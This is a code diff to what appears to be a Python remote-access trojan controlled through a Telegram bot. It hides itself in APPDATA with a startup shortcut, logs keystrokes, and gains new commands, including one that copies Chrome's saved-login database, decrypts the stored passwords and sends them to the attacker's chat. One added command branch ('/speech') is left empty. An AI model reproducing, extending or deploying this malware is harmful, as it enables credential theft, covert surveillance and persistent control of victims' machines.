@@ -6,10 +6,10 @@ from json import loads
 from winshell import startup
 from tendo import singleton
 import telepot, requests
-import time, os, os.path, platform, ctypes
-import pyHook, pythoncom
+import time, sqlite3, os, os.path, platform, ctypes
+import pyHook, pythoncom, win32crypt
 
-me = singleton.SingleInstance()
+# me = singleton.SingleInstance()   Uncomment this if you do not manage to have multiple connection for each zombie
 
 appdata_folder = os.environ['APPDATA'] 
 hide_location = appdata_folder + '\\' + 'portal.exe'
@@ -19,15 +19,16 @@ print('Appdata folder: {}'.format(appdata_folder))
 print('Hide location: {}'.format(hide_location))
 print('Target File: {}'.format(target_file))
 
-if (argv[0]).endswith('.exe'):
-	copyfile(argv[0], hide_location)
-	shell = Dispatch('WScript.Shell')
+if (argv[0]).endswith('.exe'):  # If the filename ends with the exe extension,
+	copyfile(argv[0], hide_location) # it will install copy itself on the APPDATA directory and then create
+	shell = Dispatch('WScript.Shell') # Create Dispatcher object to perform a regedit startup
 	shortcut = shell.CreateShortCut(target_file)
 	shortcut.Targetpath = hide_location
 	shortcut.WorkingDirectory = appdata_folder
 	shortcut.save()
 
-initi = False
+initi = False # Boolean variable used as double confirmation that the Attacker wants to kill the connection
+
 user = os.environ.get("USERNAME")	# Windows username
 log_file = appdata_folder + '\\keylogs.txt'	# name of log file
 with open(log_file, "a") as writing:
@@ -131,6 +132,38 @@ def handle(msg):
 			else:
 				os.startfile(path)
 				bot.sendMessage(chat_id, 'Command executed')
+
+		elif command == '/internal_ip':
+			bot.sendChatAction(chat_id, 'typing')
+			internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			internal_ip.connect(('google.com', 0))
+			bot.sendChatAction(chat_id, internal_ip.getsockname()[0])
+
+		elif command == '/get_chatid':
+			bot.sendChatAction(chat_id, 'typing')
+			bot.sendMessage(chat_id, chat_id)
+
+		elif command == '/get_chrome':
+			bot.sendChatAction(chat_id, 'typing')			
+			response = ''
+			cloned_login_data = copyfile((os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'), 'chrome')
+			connection = sqlite3.connect('chrome')
+			cursor = connection.cursor()
+			cursor.execute("SELECT origin_url,username_value,password_value from logins;")
+			for users in cursor.fetchall():
+				response += 'Website: ' + users[0] + '\n' 
+				response += 'Username: ' + users[1] + '\n' 
+				response += 'Password: ' + str(win32crypt.CryptUnprotectData(users[2], None, None, None, 0)) + '\n\n' 
+
+			with open('chrome_dump.txt', 'w+') as file_obj:
+				file_obj.writelines(response)
+
+			bot.sendDocument(chat_id, open('chrome_dump.txt', 'r'))
+			bot.sendMessage(chat_id, 'Happy Hunting!')
+			os.remove('chrome_dump.txt')
+
+		elif command.startswith('/speech'):
+
 
 		elif command == '/self_destruct':
 			bot.sendChatAction(chat_id, 'typing')
